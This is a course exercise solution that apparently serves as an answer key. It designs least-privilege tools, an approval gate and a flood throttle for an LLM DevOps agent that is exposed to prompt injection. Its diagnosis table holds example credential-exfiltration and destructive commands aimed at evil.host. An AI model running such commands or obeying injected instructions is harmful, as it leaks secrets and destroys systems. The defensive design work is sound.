# mod-306-guardrails-safety-security/exercise-03 (Least Privilege Tool Permissions) — Solution

## Approach

The DevOps assistant ships with three general-purpose escape hatches —
`run_sql(query)`, `http_request(url, method, body)`, and `run_shell(cmd)`. Each is
a single injection away from owning the data plane. The job is to turn "the agent
can do anything" into "a hijacked agent can reach nothing dangerous" by:

1. Diagnosing the over-provisioning — for each broad tool, a concrete destructive
   action and a concrete exfiltration action a single injection could trigger.
2. Refactoring each broad tool into narrow, intent-specific tools that can do
   exactly one safe thing, and listing what is now *structurally impossible*.
3. Writing a capability spec per narrow tool (risk tier, role, argument policy,
   side-effect flag, approval).
4. Wiring a tiered approval gate that renders the *exact* action for the human on
   the irreversible tier.
5. Defending against approval fatigue so the agent cannot flood approvers into
   rubber-stamping.

Chapter 3's principle drives it: grant the narrowest capability that completes the
task. A narrow tool cannot be coerced into `DROP TABLE` because the SQL is never
the agent's to write.

## Reference solution

### 1. Diagnose the over-provisioning

```text
| broad tool   | destructive (one injection)            | exfiltration (one injection)                  |
|--------------|----------------------------------------|-----------------------------------------------|
| run_sql      | DROP TABLE deployments; / DELETE FROM  | SELECT * FROM users → return PII in answer    |
| http_request | POST internal admin API to delete svc  | GET internal secrets; POST them to evil.host  |
| run_shell    | rm -rf /var/lib/...; kubectl delete    | cat ~/.aws/credentials | curl evil.host -d @-  |
```

Each broad tool is a *general* capability: the model writes the SQL, the URL, or
the command, so an injected instruction writes them too. There is no argument
envelope to enforce because the argument *is* arbitrary code.

### 2. Refactor into narrow tools

```text
| broad tool   | replaced by narrow, intent-specific tools                                  |
|--------------|----------------------------------------------------------------------------|
| run_sql      | get_deploy_status(service), list_recent_errors(service, since)             |
| http_request | (removed; no replacement — the agent has no need to reach arbitrary hosts) |
| run_shell    | restart_service(service), scale_service(service, replicas),               |
|              | delete_service(service)  [HIGH, approval]                                  |
```

Now **structurally impossible** (no tool exists to do them):

- Arbitrary SQL — there is no tool that takes a query string, so `DROP TABLE` and
  `SELECT * FROM users` cannot be expressed. Reads are constrained to two named,
  parameterized lookups over an allowlisted service.
- Arbitrary HTTP — there is no tool that takes a URL, so the agent cannot reach
  `evil.host` or any internal admin endpoint; the exfiltration channel is gone.
- Arbitrary shell — there is no tool that takes a command string, so
  `rm -rf`, `cat ~/.aws/credentials`, and `curl | sh` cannot be expressed. The
  destructive verbs the agent *does* keep (`delete_service`) are named, scoped to
  the service catalog, and gated by human approval.

### 3. Permission matrix (capability specs)

```text
| tool                | tier   | required_role | arg policy                       | side_effects | approval |
|---------------------|--------|---------------|----------------------------------|--------------|----------|
| get_deploy_status   | LOW    | dev           | service in catalog               | no           | no       |
| list_recent_errors  | LOW    | dev           | service in catalog; since <= 24h | no           | no       |
| restart_service     | MEDIUM | sre           | service in catalog               | yes          | no       |
| scale_service       | MEDIUM | sre           | service in catalog; 0 < n <= 20  | yes          | no       |
| delete_service      | HIGH   | sre_lead      | service in catalog               | yes          | YES      |
```

Read-only tools (LOW) flow freely and are logged. Reversible writes (MEDIUM) are
allowed within policy, logged, and rate-limited. The one irreversible action
(`delete_service`, HIGH) requires both the `sre_lead` role and a human approval
that shows the exact target.

### 4. Tiered approval gate

```python
"""Deterministic tiered approval gate for the DevOps assistant.

Runs in application code on arguments the model produced. The HIGH tier never
auto-allows; it renders the exact action for a human.
"""
from __future__ import annotations

from dataclasses import dataclass
from enum import Enum
from typing import Callable

SERVICE_CATALOG = frozenset({"api-prod", "api-staging", "web", "worker", "billing"})
MAX_REPLICAS = 20


class Risk(Enum):
    LOW = "low"        # read-only
    MEDIUM = "medium"  # reversible write
    HIGH = "high"      # irreversible / high-value


class Decision(Enum):
    ALLOW = "allow"
    DENY = "deny"
    REQUIRE_APPROVAL = "require_approval"


@dataclass(frozen=True)
class ToolCall:
    name: str
    arguments: dict


@dataclass(frozen=True)
class ToolSpec:
    name: str
    required_role: str
    risk: Risk
    args_within_policy: Callable[[dict], bool]
    render_for_human: Callable[[dict], str]


def _service_ok(args: dict) -> bool:
    return args.get("service") in SERVICE_CATALOG


def _errors_ok(args: dict) -> bool:
    return _service_ok(args) and args.get("since_hours", 0) <= 24


def _scale_ok(args: dict) -> bool:
    n = args.get("replicas", -1)
    return _service_ok(args) and isinstance(n, int) and 0 < n <= MAX_REPLICAS


CATALOG = {
    "get_deploy_status": ToolSpec("get_deploy_status", "dev", Risk.LOW, _service_ok,
                                  lambda a: f"read status of {a['service']}"),
    "list_recent_errors": ToolSpec("list_recent_errors", "dev", Risk.LOW, _errors_ok,
                                   lambda a: f"read errors for {a['service']}"),
    "restart_service": ToolSpec("restart_service", "sre", Risk.MEDIUM, _service_ok,
                                lambda a: f"restart {a['service']}"),
    "scale_service": ToolSpec("scale_service", "sre", Risk.MEDIUM, _scale_ok,
                              lambda a: f"scale {a['service']} to {a.get('replicas')}"),
    "delete_service": ToolSpec("delete_service", "sre_lead", Risk.HIGH, _service_ok,
                               lambda a: f"DELETE service {a['service']} (irreversible)"),
}


def gate(call: ToolCall, spec: ToolSpec, ctx) -> tuple[Decision, str]:
    if spec.required_role not in ctx.roles:
        return Decision.DENY, f"role {spec.required_role!r} not granted"
    if not spec.args_within_policy(call.arguments):
        return Decision.DENY, "arguments outside policy envelope"
    if spec.risk is Risk.HIGH:
        return Decision.REQUIRE_APPROVAL, spec.render_for_human(call.arguments)
    return Decision.ALLOW, "within policy"
```

On `delete_service(service="api-prod")` with the `sre_lead` role, the gate returns
`REQUIRE_APPROVAL, "DELETE service api-prod (irreversible)"` — the approver sees
exactly what they are signing off, so an injected delete cannot hide behind a
vague "the agent wants to do something."

### 5. Defend against approval fatigue

A rate-limiter on the *approval queue* per approver-window, plus dedup of
identical pending proposals:

```python
import time
from collections import deque

MAX_APPROVALS_PER_WINDOW = 5
WINDOW_SECONDS = 600  # 10 minutes


class ApprovalThrottle:
    def __init__(self) -> None:
        self._recent: deque[float] = deque()
        self._pending: set[tuple[str, str]] = set()

    def admit(self, tool: str, rendered_action: str) -> tuple[bool, str]:
        key = (tool, rendered_action)
        if key in self._pending:
            return False, "duplicate proposal already pending (deduped)"
        now = time.monotonic()
        while self._recent and now - self._recent[0] > WINDOW_SECONDS:
            self._recent.popleft()
        if len(self._recent) >= MAX_APPROVALS_PER_WINDOW:
            return False, "approval rate limit hit; batch and retry"
        self._recent.append(now)
        self._pending.add(key)
        return True, "queued for approval"
```

This prevents rubber-stamping two ways: an agent that tries to flood the queue
with 500 deletes hits the rate limit after five and the rest are rejected (not
auto-approved); and identical repeated proposals are deduped so the approver sees
one item, not a wall. Rejection is the low-friction default — an unread proposal
expires denied.

### Stretch: break-glass path

A documented, audited escape hatch for incidents: an on-call lead can request a
*time-boxed* broad capability (e.g. a 15-minute `run_sql_readonly` against a
replica) requiring **dual approval** from two `sre_lead`s, auto-expiring, with
every query logged. It is never the default path and every use generates an
after-action review.

## Meeting the acceptance criteria

- **Each broad tool replaced by narrow tools; destructive/exfiltration actions now
  structurally impossible** — sections 1–2: arbitrary SQL/HTTP/shell are gone, with
  the explicit impossibility list.
- **Every narrow tool has a complete capability spec** — section 3 matrix (tier,
  role, argument policy, side-effect flag, approval) and section 4 code.
- **`gate` deterministic, returns `REQUIRE_APPROVAL` with an exact human-readable
  action for HIGH** — section 4, `delete_service` renders
  `"DELETE service api-prod (irreversible)"`.
- **Approval-fatigue mechanism specified and prevents flooding** — section 5,
  rate-limit + dedup, rejection as default.
- **No remaining general-purpose escape hatch** — `run_sql`, `http_request`,
  `run_shell` are all removed; no replacement takes a free-form query/URL/command.

## Common pitfalls

- **Refactoring `run_shell` into `run_command(cmd)`.** That is the same escape
  hatch renamed. The narrow tool must take *structured intent* (`service`,
  `replicas`), never a command string.
- **Keeping `http_request` "just for internal APIs."** An internal-only URL field
  is still arbitrary egress and still reaches internal admin endpoints. Remove it;
  add named tools for the specific calls actually needed.
- **Auto-allowing the HIGH tier when the role is present.** The role is necessary
  but not sufficient — irreversible actions still require human approval. Role +
  approval are independent narrowings.
- **A vague approval prompt.** "Approve agent action?" invites rubber-stamping.
  Render the exact target and verb so the approver can spot the injected one.
- **No flood control.** Without a rate limit, an injected agent queues hundreds of
  approvals and fatigues the approver into rubber-stamping. Cap, batch, dedup.

## Verification

- **Diagnosis table:** each broad tool has a concrete destructive *and*
  exfiltration action.
- **Refactor:** every broad tool is replaced by narrow tools; the
  structurally-impossible list covers arbitrary SQL, HTTP, and shell.
- **Matrix:** every narrow tool has tier, role, argument policy, side-effect flag,
  and approval; only `delete_service` is HIGH/approval.
- **Gate:** exercise the decision matrix:

  ```python
  class Ctx:
      roles = frozenset({"sre_lead", "sre", "dev"})
  ctx = Ctx()
  assert gate(ToolCall("get_deploy_status", {"service": "web"}),
              CATALOG["get_deploy_status"], ctx)[0] is Decision.ALLOW
  assert gate(ToolCall("scale_service", {"service": "web", "replicas": 50}),
              CATALOG["scale_service"], ctx)[0] is Decision.DENY        # over cap
  d, summary = gate(ToolCall("delete_service", {"service": "api-prod"}),
                    CATALOG["delete_service"], ctx)
  assert d is Decision.REQUIRE_APPROVAL and "DELETE service api-prod" in summary
  print("all least-privilege checks passed")
  ```

- **Throttle:** queue six identical `delete_service` proposals; assert the sixth is
  rejected and duplicates are deduped.
- **`NOTES.md`** answers: the unexpected narrow tools you had to add; whether any
  broad-tool task is now impossible and if that loss is acceptable; how this matrix
  feeds the RBAC layer in exercise-04.
